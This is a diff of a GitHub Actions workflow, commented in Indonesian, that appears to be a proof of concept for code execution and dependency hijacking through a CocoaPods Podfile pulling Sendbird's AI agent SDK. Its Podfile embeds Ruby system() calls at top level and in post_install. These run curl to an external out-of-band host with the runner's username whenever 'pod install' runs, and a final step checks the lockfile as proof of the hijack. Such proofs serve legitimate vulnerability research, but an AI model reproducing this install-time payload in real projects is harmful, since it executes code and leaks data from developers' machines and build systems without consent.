@@ -17,14 +17,14 @@ jobs:
           git config --global user.name "Researcher"
 
           # Tulis Podfile dengan TOP-LEVEL EXECUTION
-          # Kode Ruby di luar blok 'target' akan langsung jalan saat 'pod install' dipanggil
           cat <<EOF > Podfile
-          # TRIGGER LANGSUNG SAAT PODFILE DIBACA
+          # 1. TRIGGER AWAL (Bukti RCE saat pembacaan metadata)
           puts "[!] INITIALIZING ATTACK PROBE..."
-          system("curl -v http://LINK-OAST-LU-DISINI.com/INIT_$(whoami)")
+          system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/INIT_$(whoami)")
 
           install! 'cocoapods', :integrate_targets => false
 
+          # Sumber resmi Sendbird vs Public Trunk
           source 'https://github.com/sendbird/sendbird-ios-distribution.git'
           source 'https://cdn.cocoapods.org/'
 
@@ -32,9 +32,11 @@ jobs:
 
           target 'PoCSimulation' do
             use_frameworks!
+            # Ini yang akan memicu konflik versi
             pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
           end
 
+          # 2. TRIGGER AKHIR (Bukti RCE setelah instalasi selesai)
           post_install do |installer|
             puts "[!] POST-INSTALL TRIGGER..."
             system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/POST_$(whoami)")
@@ -44,5 +46,13 @@ jobs:
       - name: Execution & Hijack Proof
         run: |
           cd TrialRun
-          # Paksa verbose buat liat output puts
+          # Jalankan install
           pod install --repo-update --verbose
+          
+          echo -e "\n--- VERIFIKASI PEMBAJAKAN (SKAKMAT) ---"
+          if [ -f Podfile.lock ]; then
+            echo "✅ Podfile.lock Ditemukan. Menampilkan isi:"
+            cat Podfile.lock
+          else
+            echo "❌ Podfile.lock tidak ditemukan. Cek log pod install di atas."
+          fi
